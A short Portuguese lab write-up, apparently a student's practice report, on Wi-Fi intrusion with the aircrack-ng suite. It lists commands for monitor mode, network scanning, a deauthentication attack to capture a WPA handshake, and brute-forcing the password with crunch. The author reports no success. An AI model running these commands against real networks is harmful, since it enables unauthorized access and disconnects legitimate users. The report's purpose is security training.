## Invasão Wifi

Para a realização da prática foi bem simples, devido a um conhecimento prévio da ferramenta e pela descrição detalhada do tutorial.

A seguir serão apresentados os passos que foram executados, porém, nenhuma senha foi detectada devido a demora no processo de identificação.

- Para verificar o nome da minha interface wifi foi dado o comando ```iwconfig```.
- Depois, foi dado o comando ```airmon-ng check kill``` para matar qualuqer processo que possa impeder a captura de pacotes
- Para deixar a placa de rede em modo monitor foi executado este comando ```àirmon-ng start wlan0```
- Para identificar as redes disponíveis foi executado o seguinte comando ```airodump-ng wlan0mon```
- Após selecionar a rede alvo, será executado o seguinte comando para iniciar o monitoramento desta rede ```airodump-ng -c [canal_da_rede_alvo] --bssid [bssid_da_rede_alvo] -w dados```
- Agora, será realizado o **WPA HANDSHAKE**, para isso será desconectado algum usuário da rede usando este comando ```aireplay-ng -0 10 -a [bssid_da_rede_alvo] wlan0mon```
- Depois é foi preciso executar o seguinte comando para quebrar a senha por meio de força bruta ```crunch [min] [max] [padrão] | aircrack-ng [file.cap] -w -e [bssid_da_rede_alvo]```

![](images/wifi.png)

No geral a atividade foi simples e o tutorial está bem descrito, nos testes realizados as senhas provavelmente eram bem seguras o que impossibilitou a decifragem a curto prazo.